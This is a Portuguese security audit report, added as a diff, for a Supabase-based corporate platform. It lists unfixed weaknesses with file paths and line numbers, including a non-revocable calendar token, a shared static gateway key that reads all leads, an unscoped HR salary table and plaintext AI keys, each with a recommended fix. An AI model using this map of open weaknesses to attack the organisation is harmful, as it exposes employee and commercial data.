+      para anon, e INSERT em chave existente falha) — mas plantar
+      `<uuid-da-vítima>/curriculo.pdf` ANTES de ela enviar o dela, sim.
+      O RH abre um arquivo de origem desconhecida achando que é o currículo do
+      candidato.
+
+Observação adicional (funcional, não exploração): a policy de leitura
+`rh_curriculos_rh_read` usa `profiles.role IN ('admin','gerente_rh','rh')` —
+coluna escalar. Alguém com 'rh' como cargo ADICIONAL não consegue abrir
+currículo nenhum. Mesmo desalinhamento do AL-06, aqui negando acesso legítimo.
+
+CORREÇÃO RECOMENDADA:
+  a) Limitar objetos por pasta na policy de INSERT (subconsulta contando
+     `storage.objects` daquele prefixo, teto de 2-3) e/ou exigir que o nome do
+     arquivo seja exatamente `curriculo.<ext>`.
+  b) Fazer `submit_talent_pool_application` NÃO devolver o UUID quando a linha
+     já existia (devolver um token opaco de upload, de uso único e curta
+     validade, é o desenho correto).
+  c) Alinhar `rh_curriculos_rh_read` para `roles &&` em vez de `role =`.
+  d) Job de limpeza para objetos órfãos (pasta sem aplicação correspondente).
+
+--------------------------------------------------------------------------------
+[MD-04] `calendar-ics`: token permanente na URL, sem rotação, sem revogação,
+        sem limite de tentativas
+--------------------------------------------------------------------------------
+Severidade.: MÉDIO
+Local......: supabase/functions/calendar-ics/index.ts:56-83 (verify_jwt=FALSE)
+             src/components/campaign/CampaignCalendar.jsx:163-167
+
+A URL entregue ao usuário é:
+  <SUPABASE_URL>/functions/v1/calendar-ics?token=<calendar_token>&type=personal
+
+Problemas:
+  - Token de sessão eterna em QUERY STRING. Vai para o histórico do navegador,
+    para logs de proxy, e — por desenho do recurso — é COLADO em serviço de
+    terceiro (Google Calendar, Outlook, Apple), que passa a guardá-lo e a
+    buscá-lo periodicamente para sempre.
+  - Não há NENHUMA forma de rotacionar ou revogar pela interface. Busca em src/
+    encontra apenas leitura/exibição de `calendarToken` — nenhum "gerar novo
+    link". Vazou, vazou para sempre (só com acesso direto ao banco se resolve).
+  - Sem limite de tentativas: a função aceita requisições ilimitadas testando
+    tokens. O token é um UUID (128 bits — força bruta não é realista), mas a
+    ausência do limite também significa que o endpoint serve como amplificador
+    de carga contra o banco, com service_role, sem autenticação.
+  - A boa notícia: o escopo está CORRETO. A checagem de empresa foi consertada
+    numa auditoria anterior (fail-closed quando `companies` é vazio) e usa
+    `roles[]`, não o escalar. Isso está verificado no código atual.
+
+CORREÇÃO RECOMENDADA:
+  a) Botão "Gerar novo link do calendário" em Configurações →
+     `UPDATE profile_secrets SET calendar_token = gen_random_uuid()` (a policy
+     `profile_secrets_self` já permite: `id = auth.uid()` para ALL). Isso é
+     mudança visual → mockup antes (regra 3).
+  b) Registrar `last_used_at` para dar visibilidade de link ativo/esquecido.
+  c) Considerar prazo de validade (ex.: 12 meses) com aviso antes de expirar.
+
+--------------------------------------------------------------------------------
+[MD-05] `AGENT_GATEWAY_KEY`: chave única, estática, com leitura de TODOS os
+        leads de TODAS as empresas
+--------------------------------------------------------------------------------
+Severidade.: MÉDIO
+Local......: supabase/functions/agent-gateway/index.ts:213, 379-401
+
+A rota `?action=leads` roda com `adminClient` (service_role) e devolve, sem
+nenhum recorte por empresa quando o filtro não é passado:
+  .select('id, company_id, company, stage, owner, urgency, fit_score, value,
+           last_activity, stage_changed_at, next_follow_up, cnpj, sector,
+           decision_maker, notes')
+  ... .limit(Math.min(limit, 500))
+
+Ou seja, a chave sozinha lê o funil comercial do Grupo inteiro — CNPJ, valor do
+negócio, tomador de decisão e notas do vendedor — em blocos de 500.
+
+  - Chave única compartilhada por TODAS as automações n8n. Não há como saber
+    qual automação usou, nem revogar uma sem quebrar as outras.
+  - Sem prazo de validade e sem rotação documentada.
+  - Comparação não é em tempo constante (`agentKey === expectedKey`,
+    agent-gateway:216). O mesmo em personal-tasks-agent/index.ts:71 e
+    d4sign-webhook/index.ts:64. O `sanwey-crm-mcp` faz certo (timingSafeEqual) —
+    vale padronizar por ele.
+
+Nota positiva: o furo grave anterior desta função (aceitar qualquer string que
+começasse com "Bearer ") FOI corrigido e está verificado — hoje resolve o
+usuário via `auth.getUser()` antes de confiar no JWT.
+
+CORREÇÃO RECOMENDADA:
+  a) Uma chave POR automação (prefixo identificador + segredo), guardadas numa
+     tabela com `revoked_at`, para poder revogar individualmente e ter rastro.
+  b) Exigir `company_id` obrigatório em `?action=leads`, ou amarrar a chave a
+     uma empresa.
+  c) Trocar as 3 comparações `===` por comparação em tempo constante.
+  d) Log estruturado por chamada, no molde que o `sanwey-crm-mcp` já faz.
+
+--------------------------------------------------------------------------------
+[MD-06] `ai-assistant`: qualquer usuário autenticado gasta a chave de IA da
+        empresa, com prompt arbitrário e sem limite
+--------------------------------------------------------------------------------
+Severidade.: MÉDIO
+Local......: supabase/functions/ai-assistant/index.ts:52-66
+             supabase/functions/ai-assistant/_shared/ai-provider.ts:96-110
+
+A autenticação foi corrigida em auditoria anterior (getUser() presente e
+funcionando). O que sobra:
+  - Nenhuma checagem de CARGO. Qualquer conta ativa serve.
+  - `messages` vem 100% do body, sem qualquer restrição de tamanho ou conteúdo.
+  - `resolveProviderConfig(null)` cai no fallback da chave da EMPRESA
+    (AI_ORG_API_KEY) quando o usuário não tem chave pessoal.
+  - `maxTokens` vem do body (default 1200) — sem teto imposto pelo servidor.
+  - Sem limite de taxa e sem contabilização por usuário.
+
+Resultado: um estagiário — ou uma sessão roubada de qualquer cargo — usa a conta
+paga da empresa como proxy de LLM de uso geral, e não há como saber quem gastou.
+Não é vazamento de dado; é abuso de recurso e ausência de rastreabilidade.
+
+Ponto positivo verificado: NÃO há SSRF. O `provider` é comparado contra três
+valores fixos e as URLs são literais no código — não existe caminho para o
+chamador escolher o host de destino.
+
+CORREÇÃO RECOMENDADA:
+  a) Impor teto de `maxTokens` no servidor (ex.: `Math.min(body.maxTokens, 2000)`).
+  b) Contador por usuário/dia antes de liberar a chave da ORG (a chave PESSOAL
+     do usuário pode seguir sem cota — o custo é dele).
+  c) Log estruturado: user_id + provider + tokens, no molde do sanwey-crm-mcp.
+
+--------------------------------------------------------------------------------
+[MD-07] Proxies do Google (Places / Distance Matrix / Geocoding) sem limite de
+        taxa — conta de billing exposta a qualquer usuário autenticado
+--------------------------------------------------------------------------------
+Severidade.: MÉDIO
+Local......: supabase/functions/places-autocomplete/index.ts
+             supabase/functions/distance-matrix/index.ts (MAX_STOPS=10, bom)
+             supabase/functions/reverse-geocode/index.ts
+
+As três dependem exclusivamente do `verify_jwt=true` da plataforma — o que
+significa que basta um JWT válido qualquer (inclusive o de um usuário de menor
+privilégio) para disparar chamadas ilimitadas a APIs COBRADAS POR REQUISIÇÃO.
+O `distance-matrix` já limita paradas por chamada (MAX_STOPS=10, com comentário
+explicando que é vetor de custo — raciocínio certo), mas nada limita o número
+de CHAMADAS.
+
+O tratamento da chave está EXEMPLAR nas três: `redact()` remove `key=` de
+qualquer log, e nenhum erro bruto volta ao cliente justamente porque o
+TypeError do Deno carrega a URL completa. Isso está bem feito e deve ser
+mantido como referência.
+
+Exceção a corrigir — `places-autocomplete` NÃO segue o padrão das irmãs:
+    return jsonResponse({ suggestions: [], error: `Google Places: ${googleRes.status} ${errText}` }, 200);
+    ...
+    } catch (e) { return jsonResponse({ suggestions: [], error: String(e) }, 200); }
+Aqui a chave vai em HEADER (X-Goog-Api-Key), não na URL, então o risco imediato
+de vazá-la é baixo — mas repassar corpo de erro do Google e `String(e)` cru é
+justamente o que as outras duas foram corrigidas para não fazer.
+
+CORREÇÃO RECOMENDADA:
+  a) Contador por usuário/janela (tabela `external_cache` já existe e pode
+     servir de âncora sem schema novo).
+  b) Restringir a chave GOOGLE_PLACES_API_KEY no console do Google (por API e
+     por referrer/IP) — mitiga mesmo que o proxy seja abusado.
+  c) Alinhar `places-autocomplete` ao padrão de `redact()` das irmãs.
+
+--------------------------------------------------------------------------------
+[MD-08] Cabeçalhos de segurança HTTP incompletos — sem CSP, sem HSTS
+--------------------------------------------------------------------------------
+Severidade.: MÉDIO
+Local......: netlify.toml (bloco [[headers]])
+
+PRESENTE:  X-Frame-Options=DENY, X-Content-Type-Options=nosniff,
+           Referrer-Policy=strict-origin-when-cross-origin
+AUSENTE:   Content-Security-Policy, Strict-Transport-Security,
+           Permissions-Policy, Cross-Origin-Opener-Policy
+
+Sem CSP, qualquer XSS que venha a surgir (hoje o código está limpo — ver
+pontos fortes) tem execução irrestrita e pode exfiltrar para qualquer host.
+CSP é a rede de proteção para o dia em que uma dependência do frontend for
+comprometida — cenário concreto aqui, dado o AL-05.
+
+CORREÇÃO RECOMENDADA (netlify.toml — começar em Report-Only por 1-2 semanas):
+  Content-Security-Policy = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob: https://*.supabase.co; connect-src 'self' https://*.supabase.co wss://*.supabase.co https://api.openai.com https://api.anthropic.com https://generativelanguage.googleapis.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'"
+  Strict-Transport-Security = "max-age=31536000; includeSubDomains; preload"
+  Permissions-Policy = "geolocation=(self), microphone=(self), camera=(), payment=()"
+  (geolocation e microphone precisam de 'self': check-in de visita por GPS e
+   Ata de Visita por voz dependem dos dois.)
+  Cross-Origin-Opener-Policy = "same-origin"
+
+--------------------------------------------------------------------------------
+[MD-09] Proteção contra senha vazada (HaveIBeenPwned) DESLIGADA
+--------------------------------------------------------------------------------
+Severidade.: MÉDIO
+Local......: Supabase Auth — confirmado pelo Security Advisor em produção
+             (lint `auth_leaked_password_protection`, nível WARN)
+
+O Supabase oferece checagem automática contra a base do HaveIBeenPwned no
+cadastro e na troca de senha. Está desativado. Com login por e-mail+senha como
+caminho principal, isso significa que usuários podem (e vão) reutilizar senhas
+já vazadas em outros serviços — o vetor nº 1 de comprometimento de conta
+corporativa, e o que torna todos os achados de escalonamento lateral deste
+relatório (AL-04, AL-06) muito mais fáceis de encadear.
+
+CORREÇÃO: Dashboard → Authentication → Policies → habilitar "Leaked password
+protection". Um clique, sem impacto em código. Avaliar junto: tamanho mínimo de
+senha e MFA para cargos admin/gerente.
+
+--------------------------------------------------------------------------------
+[MD-10] `rh_colaboradores` (salário, CPF, contrato) sem NENHUM recorte por
+        empresa
+--------------------------------------------------------------------------------
+Severidade.: MÉDIO — confirmar intenção com o Daniel
+Local......: policy `rh_colaboradores_rh_access` (produção)
+
+  USING: current_user_is_admin()
+         OR current_user_has_role('gerente_rh')
+         OR current_user_has_role('rh')
+
+Nenhuma menção a `companies`. Qualquer pessoa com cargo 'rh' lê o cadastro
+completo de TODOS os colaboradores das TRÊS frentes (Sanwey Indústria, Resibag,
+Monte Mor) — salários incluídos.
+
+Compare com o padrão adotado no Comercial, que é rigoroso:
+  clients_read: ... AND company_ids && current_user_companies()
+  leads_select: ... AND company_id = ANY(current_user_companies())
+
+Pode ser deliberado (RH centralizado atende o Grupo inteiro — é comum e
+legítimo). Mas é a MAIOR concentração de dado pessoal sensível da plataforma
+sob a permissão MENOS granular, e não está documentado em lugar nenhum como
+decisão. Sob a LGPD, "necessidade e finalidade" pedem que isso seja uma escolha
+registrada, não um efeito colateral.
+
+CORREÇÃO RECOMENDADA:
+  a) Se for intencional: registrar no CLAUDE.md, ao lado das outras exceções
+     deliberadas (como a de Compras/PURCHASE_STAGES), para que nenhuma auditoria
+     futura "corrija" isso por engano.
+  b) Se não for: adicionar `AND companies && current_user_companies()` ao
+     predicado, espelhando `clients_read`.
+  c) Em qualquer caso, considerar mascarar `salary` para o cargo 'rh' comum,
+     deixando o valor visível só para 'gerente_rh'/'admin' — hoje um assistente
+     de RH vê a folha inteira do Grupo.
+
+--------------------------------------------------------------------------------
+[MD-11] Dois modelos de permissão convivendo: `role` escalar vs `roles[]` —
+        22 policies ainda no modelo antigo
+--------------------------------------------------------------------------------
+Severidade.: MÉDIO (dívida estrutural — origem de AL-06 e de MD-03)
+Local......: 22 policies em produção. As mais relevantes:
+             rh_candidatos_rh_access, rh_avaliacoes_read, rh_avaliacoes_write,
+             rh_vagas_rh_access, rh_aplicacoes_rh_access, rh_stage_history_*,
+             rh_onboarding_*, rh_treinamento_*, agent_actions_seller_read,
+             agent_actions_seller_resolve, agent_actions_manager_all,
+             activities_select, activities_insert, activities_update,
+             lsh_select, automations_write, pipeline_stage_transitions_write,
+             crm_viagem_categorias_write
+
+Como o trigger `profiles_sync_roles` garante `role ∈ roles`, o modelo escalar é
+sempre um SUBCONJUNTO do multi-cargo. Na maioria dos casos isso NEGA acesso
+legítimo (um 'rh' secundário não abre currículo — ver MD-03) — chato, mas
+seguro. O perigo aparece quando o escalar é usado numa condição de NEGAÇÃO,
+que é exatamente o AL-06 (`role <> 'admin'`).
+
+O risco real aqui é de CONFIANÇA: com dois modelos vivos, ninguém consegue
+responder "quem enxerga X?" sem abrir o banco. É o terreno em que erros como o
+AL-06 nascem e passam despercebidos.
+
+CORREÇÃO RECOMENDADA:
+  a) Migration única convertendo as 22 para `current_user_has_role(...)` /
+     `roles &&`, tratando as condições de negação com cuidado extra.
+  b) Depois disso, remover a coluna `profiles.role` ou marcá-la como
+     DEPRECATED com comentário no schema, para impedir novo uso.
+  c) Regra no CLAUDE.md: "policy nova NUNCA lê `profiles.role`; sempre `roles[]`
+     via os helpers `current_user_*`".
+
+--------------------------------------------------------------------------------
+[MD-12] Chaves pessoais de IA guardadas em texto plano no banco
+--------------------------------------------------------------------------------
+Severidade.: MÉDIO
+Local......: `profile_secrets.ai_config` (jsonb)
+             supabase/migrations/20260819_sec_profile_secrets_split.sql
+             src/hooks/use-profiles.js:146
+
+A separação de `profiles` para `profile_secrets` (19/08) foi a decisão certa e
+está funcionando: a policy `profile_secrets_self` é `id = auth.uid()` para ALL,
+então nem admin nem gerente leem a chave de outra pessoa. Isso resolveu o
+vazamento que a migration 20260725 documenta.
+
+O que resta: a chave da OpenAI/Anthropic/Gemini do usuário fica em CLARO no
+JSONB. Qualquer caminho com service_role (as 20+ edge functions, o MCP, um
+backup, um dump de suporte) lê o valor. Chave de LLM é credencial com custo
+financeiro direto.
+
+CORREÇÃO RECOMENDADA:
+  a) Guardar apenas os últimos 4 caracteres para exibição e cifrar o resto
+     (pgsodium / Supabase Vault), decifrando só dentro da edge function.
+  b) Alternativa mais simples e talvez melhor: NÃO guardar chave pessoal.
+     Padronizar na chave da empresa (AI_ORG_*, já implementada como fallback)
+     com cota por usuário (ver MD-06), e remover o campo do formulário.
+  c) Enquanto qualquer das duas não acontecer: garantir que nenhum log de edge
+     function imprima `body` inteiro (verificado hoje: nenhum imprime — manter).
+
+================================================================================
+PARTE 4 — ACHADOS BAIXO
+================================================================================
+
+[BX-01] 52 funções SECURITY DEFINER com EXECUTE concedido a `anon`.
+        Local: Security Advisor, lint `anon_security_definer_function_executable`.
+        Verificado uma a uma: as sensíveis (approve_purchase_request,
+        approve_rh_movimentacao, reject_*, chat_create_channel, chat_start_dm)
+        TÊM guarda correta — abortam com `IF v_uid IS NULL THEN RAISE EXCEPTION`
+        e ainda checam cargo (`current_user_is_admin()`, `current_user_has_role`).
+        A maioria do resto são funções de TRIGGER (retornam `trigger`), que
+        falham se chamadas direto. Não é explorável hoje — é higiene de
+        superfície: o GRANT amplo vem de `GRANT ... TO PUBLIC` implícito.
+        Correção: `REVOKE EXECUTE ... FROM anon, PUBLIC` em tudo que não seja
+        deliberadamente público (a lista deliberada é: submit_lead_capture,
+        submit_job_application, submit_talent_pool_application,
+        submit_pesquisa_resposta, submit_bemestar_agendamento, get_vaga_publica,
+        get_pesquisa_publica, get_bemestar_sessao_publica,
+        get_bemestar_horarios_disponiveis, rh_candidato_exists).
+
+[BX-02] `chat_profile_matches_filter` com search_path mutável.
+        Local: Security Advisor, lint `function_search_path_mutable`.
+        Todas as outras funções já usam `SET search_path TO 'public','pg_temp'`.
+        Esta ficou de fora. Vetor de sequestro de resolução de nome por quem
+        conseguir criar objeto num schema anterior no path.
+        Correção: `ALTER FUNCTION public.chat_profile_matches_filter(...)
+                   SET search_path = public, pg_temp;`
+
+[BX-03] Extensão `pg_net` instalada no schema `public`.
+        Local: Security Advisor, lint `extension_in_public`.
+        pg_net faz requisição HTTP a partir do banco. No schema public, fica ao
+        alcance de qualquer resolução de nome não qualificada.
+        Correção: mover para schema `extensions` (procedimento padrão Supabase).
+
+[BX-04] 4 tabelas com RLS habilitada e ZERO policies (nega tudo).
+        `marketing_protocol_numbers`, `rapp_cargas`, `rapp_ibama`,
+        `rh_pesquisa_respostas`.
+        Postura segura (deny-all), mas provavelmente NÃO intencional em
+        `rapp_cargas`/`rapp_ibama` (módulo ESG/IBAMA) — se alguma tela tenta ler
+        essas tabelas com a sessão do usuário, ela está silenciosamente vazia.
+        Vale confirmar: são acessadas só por SECURITY DEFINER/service_role?
+        Se sim, documentar. Se não, é bug funcional escondido.
+
+[BX-05] Comparação de segredo NÃO em tempo constante em 3 pontos.
+        agent-gateway/index.ts:216      `agentKey === expectedKey`
+        personal-tasks-agent/index.ts:71 `providedKey !== expectedKey`
+        d4sign-webhook/index.ts:64       `receivedHash !== expectedHash`
+        Exploração remota é difícil (ruído de rede domina), mas o custo de
+        corrigir é ~8 linhas. O `sanwey-crm-mcp` já tem `timingSafeEqual()`
+        pronto — copiar de lá.
+
+[BX-06] `places-autocomplete` devolve corpo de erro do Google e `String(e)`.
+        places-autocomplete/index.ts:56-58 e no catch final.
+        Chave vai em header (não na URL), então o risco de vazá-la é baixo —
+        mas quebra o padrão que `distance-matrix` e `reverse-geocode` adotaram
+        deliberadamente após revisão de segurança. Alinhar.
+
+[BX-07] `cnpj-lookup` repassa corpo de erro do upstream ao cliente.
+        cnpj-lookup/index.ts:190 → `detail: text.slice(0, 300)`.
+        BrasilAPI é público e sem chave; impacto praticamente nulo. Citado só
+        para consistência de padrão.
+
+[BX-08] Bucket `chat-stickers` é público (`public: true`).
+        Único bucket público dos 12. Figurinhas de chat — provavelmente
+        deliberado e de baixo impacto. Vale confirmar que nenhum upload de
+        usuário cai ali sem moderação (limite de 2 MB e MIME png/webp já
+        aplicados, o que é bom).
+
+[BX-09] `external_cache` legível por QUALQUER usuário autenticado
+        (`external_cache_auth_read` USING true). Contém retorno de consulta de
+        CNPJ (incl. e-mail e telefone da empresa consultada) e de Comex.
+        Dado majoritariamente público (Receita Federal), mas expõe QUEM a Sanwey
+        andou pesquisando — inteligência comercial visível para todo o quadro.
+        Considerar restringir a leitura aos cargos que usam o recurso.
+
+[BX-10] Sessão persiste em localStorage por padrão.
+        src/lib/supabase.js:19-22. A preferência "Lembrar-me" foi implementada
+        (sessionStorage quando desmarcado) e está correta — mas o padrão, sem
+        escolha explícita, é persistir. Combinado com a ausência de MFA e com
+        MD-09, um token roubado do navegador vale muito. Considerar reduzir o
+        tempo de vida do refresh token no projeto.
+
+================================================================================
+PARTE 5 — INFORMATIVO / DERIVA
+================================================================================
+
+[IN-01] Dependências de BUILD com CVEs (não vão para o navegador do usuário —
+        risco é para a máquina de quem builda e para o servidor de dev):
+          HIGH  vite <=6.4.2        path traversal em .map de deps otimizadas
+          HIGH  postcss <=8.5.22    leitura arbitrária de .map via sourceMappingURL
+          HIGH  nanoid <=3.3.17     laço infinito
+          HIGH  ws 8.x              exposição de memória não inicializada
+          HIGH  brace-expansion     DoS por expansão sem limite
+          HIGH  fast-uri            confusão de host
+          MOD   esbuild <=0.24.2    qualquer site lê respostas do dev server
+          LOW   @babel/core         leitura de arquivo via sourceMappingURL
+        Correção: `npm audit fix` resolve a maioria; vite e esbuild podem exigir
+        salto de major (vite 5 → 7). Testar o build antes.
+
+[IN-02] Dependência de RUNTIME com CVE além do xlsx (AL-05):
+          HIGH  react-router 7.15.1 — redirecionamento aberto via barra invertida
+                em <Link>/useNavigate (bypass de CVE-2025-68470), e
+                injeção de construtor via deserializeErrors() em hidratação SSR.
+        O app é SPA sem SSR, o que elimina a parte de hidratação. O
+        redirecionamento aberto é relevante nas rotas que recebem parâmetro da
+        URL (/captura/:slug, /vagas/:slug, /gestor-vaga/:token, /pesquisa/:id).
+        Correção: atualizar react-router-dom para >= 7.18.2.
+
+[IN-03] `personal-tasks-agent` está no repositório e documentado em
+        personal-tasks-agent-api.md, mas NÃO consta entre as functions ativas do
+        projeto. Deriva na direção oposta ao AC-02. Decidir: deployar ou
+        remover a documentação, que hoje descreve um endpoint inexistente.
+
+[IN-04] 27 chamadas de `console.*` no frontend. Nenhuma imprime credencial
+        (verificado). Sem achado — registrado só para constar que foi checado.
+
+[IN-05] Nenhum `supabase/config.toml` no repositório. O `verify_jwt` de cada
+        function existe apenas como estado no painel do Supabase, não como
+        código. Recomenda-se versionar o config.toml para que a postura de
+        autenticação de cada function seja revisável em diff — hoje só se
+        descobre consultando a API.
+
+[IN-06] Nenhum CI de segurança. O único workflow (.github/workflows/
+        upload-email-templates.yml) só publica templates de e-mail. Não há
+        `npm audit`, nem varredura de segredo, nem `get_advisors` automatizado.
+        Todo o processo do CLAUDE.md 3.1 depende de alguém lembrar de rodar.
+
+================================================================================
+PARTE 6 — O QUE ESTÁ CERTO (e deve ser preservado)
+================================================================================
+
+Estas verificações foram feitas e PASSARAM. Registradas para que uma refatoração
+futura não desfaça sem perceber:
+
+RLS E BANCO
+  • 120/120 tabelas do schema public com RLS habilitada. Zero exceções.
+    O Advisor NÃO reporta nenhum `rls_disabled_in_public` — raríssimo num
+    projeto deste tamanho (120 tabelas, 257 migrations).
+  • Auto-escalação de cargo BLOQUEADA no banco, por trigger, não por policy:
+    `profiles_prevent_self_role_escalation` restaura role, roles, companies,
+    sectors, supervisor_id, employee_status, job_title, department,
+    contract_type, admission_date, frente, supplier_id, client_id e
+    chat_enabled a partir de OLD sempre que `auth.uid() = NEW.id` e o usuário
+    não é admin. Defesa na camada certa.
+  • `rh_ferias_insert` impede auto-aprovação por construção:
+    `status='pendente' AND approved_by IS NULL AND approved_at IS NULL`.
+    Mesmo padrão em `rh_movimentacoes_insert`. Corrige a classe de bug que o
+    CLAUDE.md registra como já ocorrida.
+  • `notifications` não tem policy de INSERT — usuário não fabrica notificação
+    para outro (vetor de phishing interno fechado por ausência deliberada).
+  • Isolamento por empresa correto e consistente em `leads` e `clients`.
+  • Nenhuma policy com `USING (true)` em tabela de dado de negócio — as 6 que
+    existem são tabelas de CONFIGURAÇÃO (automations, ncm_catalog,
+    pipeline_stage_transitions, rh_pipeline_stages, rh_pipeline_stage_fields,
+    external_cache), somente leitura, só para `authenticated`.
+
+FORMULÁRIOS PÚBLICOS
+  • `marketing_requests_public_insert` trava as colunas que importam
+    (status, approved_by/at, deliverable_id, task_id, purchase_request_id,
+    rejection_reason, company_ids) — não dá para se auto-aprovar nem para
+    vincular a registro existente.
+  • Validação de e-mail por regex, consentimento LGPD obrigatório e
+    `consentimento_lgpd_at` gravado nas RPCs de candidatura.
+  • `submit_lead_capture` dedupe/limita por telefone normalizado (3/24h).
+
+EDGE FUNCTIONS
+  • Destinatário de e-mail resolvido SEMPRE no servidor a partir do id do
+    registro, nunca do body (rh-send-email HARDENED_TYPES, send-crm-email,
+    send-quote-request, send-deliverable-*, send-request-status-email).
+    Fecha relay aberto de phishing com o domínio da empresa.
+  • `d4sign-send` valida cargo E amarra bucket/path ao registro
+    (`sourceStorageBucket !== 'rh-documentos-assinatura'` → 400), impedindo que
+    a service_role seja usada para baixar arquivo arbitrário e enviá-lo a
+    terceiro.
+  • `google-drive-upload` valida a posse da pasta com um client escopado ao JWT
+    do CHAMADOR (a RLS de marketing_campaigns decide) — tratamento correto de
+    confused deputy.
+  • `crm-ata-voz` NÃO usa service_role em ponto nenhum, de propósito: o áudio é
+    baixado com o JWT de quem chamou, então a RLS do Storage decide. E não
+    escreve no banco. Desenho exemplar.
+  • `d4sign-webhook` falha FECHADO sem D4SIGN_WEBHOOK_SECRET (503).
+  • `manager-vaga-review` (link público de gestor externo): token de alta
+    entropia + confirmação de e-mail, mensagem de erro genérica idêntica para
+    todos os casos de falha (não vira oráculo), URL assinada de currículo com
+    validade de 900s, e confere que a aplicação pertence à vaga do link.
+  • `redact()` em distance-matrix e reverse-geocode, com o raciocínio correto
+    documentado no próprio arquivo (o TypeError de rede do Deno carrega a URL
+    com a chave).
+  • `sanwey-crm-mcp`: comparação em tempo constante, somente leitura, validação
+    de UUID, nunca concatena filtro PostgREST cru (`.eq()`/`.in()`
+    parametrizados, com o motivo escrito no código), log estruturado por
+    chamada. Só precisa entrar no Git.
+
+FRONTEND
+  • ZERO `dangerouslySetInnerHTML`, ZERO `.innerHTML`, ZERO `eval`,
+    ZERO `new Function`, ZERO `javascript:`. Superfície de XSS praticamente
+    inexistente — mérito real num app deste tamanho.
+  • ZERO segredos no repositório e no bundle. `.env` corretamente no
+    `.gitignore`. `.env.example` só com placeholders.
+  • Service worker cacheia apenas o shell (JS/CSS/ícones); nenhuma chamada ao
+    Supabase (auth/dados/realtime) passa pelo SW.
+
+PROCESSO
+  • As correções das auditorias anteriores estão VERIFICADAS em produção, não
+    só no código: o fail-open do escopo de empresa em `calendar-ics`, o
+    `getUser()` do `ai-assistant`, o JWT falso do `agent-gateway`, a separação
+    `profile_secrets`, o path livre do `rh-curriculos`, a checagem de cargo do
+    `d4sign-send`. Nenhuma regrediu.
+  • Cada correção de segurança está comentada no código com o achado que a
+    originou e a data. Isso é o que tornou esta auditoria rápida e o que
+    impede que a próxima sessão "simplifique" a proteção sem saber o que ela
+    protegia.
+
+================================================================================
+PARTE 7 — PLANO DE AÇÃO SUGERIDO
+================================================================================
+
+Ordenado por (impacto ÷ esforço). Os itens marcados [SCHEMA] exigem confirmação
+explícita do Daniel antes de aplicar (regra 5 do CLAUDE.md) e passagem pelo
+security-agent (regra 3.1).
+
+AGORA (minutos, sem risco, sem migration)
+  1. [MD-09] Ligar "Leaked password protection" no painel Supabase.     1 clique
+  2. [AL-01] Corrigir `csvCell` em src/utils/export-csv.js.             4 linhas
+  3. [AL-03] Apagar a edge function `analyze-lead` de produção.
+  4. [AC-02] Commitar sanwey-crm-mcp, analyze-lead e
+             check-document-legibility em supabase/functions/.
+  5. [MD-08] Adicionar CSP (Report-Only), HSTS e Permissions-Policy
+             ao netlify.toml.
+
+ESTA SEMANA
+  6. [AL-05] Migrar `xlsx` para a distribuição corrigida (cdn.sheetjs.com).
+  7. [IN-02] Subir react-router-dom para >= 7.18.2.
+  8. [AL-04] Escopar `delete-user` (cargo do alvo + empresa).
+  9. [AL-06] [SCHEMA] Trocar `role <> 'admin'` por
+             `NOT ('admin' = ANY(roles))` nas 4 policies.
+ 10. [BX-02] [SCHEMA] Fixar search_path de chat_profile_matches_filter.
+ 11. [BX-05] Comparação em tempo constante nos 3 pontos.
+ 12. [IN-01] `npm audit fix` + validar `npx vite build`.
+
+ESTE MÊS
+ 13. [AC-01] DECIDIR o destino de "Acesso por módulo" (controle real ou
+             renomear para "itens de menu"). É a decisão de maior impacto
+             deste relatório e é do Daniel, não da sessão.
+ 14. [AL-02] Rate-limit no reenvio de "candidatura_recebida".
+ 15. [MD-01] Rate-limit por contato (não global) nos formulários públicos.
+ 16. [MD-02] [SCHEMA] Converter o INSERT público de marketing_requests em RPC.
+ 17. [MD-04] Botão de rotação do link de calendário (precisa de mockup — regra 3).
+ 18. [MD-10] Decidir e DOCUMENTAR o escopo de RH por empresa.
+ 19. [MD-05] Chave por automação no agent-gateway, com revogação.
+ 20. [MD-06]/[MD-07] Cotas e log por usuário nas functions que gastam dinheiro.
+
+ESTRUTURAL (trimestre)
+ 21. [MD-11] [SCHEMA] Unificar `role` escalar → `roles[]` nas 22 policies e
+             marcar a coluna como DEPRECATED.
+ 22. [MD-12] Cifrar (ou eliminar) as chaves pessoais de IA.
+ 23. [BX-01] [SCHEMA] REVOKE em massa do EXECUTE de `anon` sobre as funções
+             que não são deliberadamente públicas.
+ 24. [IN-06] CI de segurança: `npm audit`, varredura de segredo e
+             `get_advisors` a cada PR.
+ 25. [IN-05] Versionar `supabase/config.toml` com o verify_jwt de cada function.
+ 26. Avaliar MFA obrigatório para cargos admin/gerente.
+
+================================================================================
+NOTA DE ESCOPO E LIMITAÇÕES
+================================================================================
+  • Auditoria estática + inspeção de configuração ao vivo. NÃO houve teste de
+    intrusão: nenhuma das cadeias de ataque descritas foi executada contra o
+    ambiente. As cadeias foram derivadas do código-fonte e dos predicados de
+    policy lidos diretamente do banco de produção — são reproduzíveis, mas não
+    foram reproduzidas.
+  • Não foram avaliados: segurança física/organizacional, quem tem acesso ao
+    painel Supabase e ao Netlify, rotação de segredos fora do repositório,
+    backups e teste de restauração, política de retenção LGPD, e o produto
+    separado `secretaria-agentic`.
+  • Os projetos Supabase Sanwey-Jogos, secretaria-agentic e portal-b2b-resibag
+    estão na mesma organização e NÃO foram auditados — se compartilham
+    credencial ou dado com este, merecem passagem própria.
+  • Nada foi alterado no banco, no Storage, nas policies ou nas edge functions.
+
+================================================================================
+FIM DO RELATÓRIO
+================================================================================
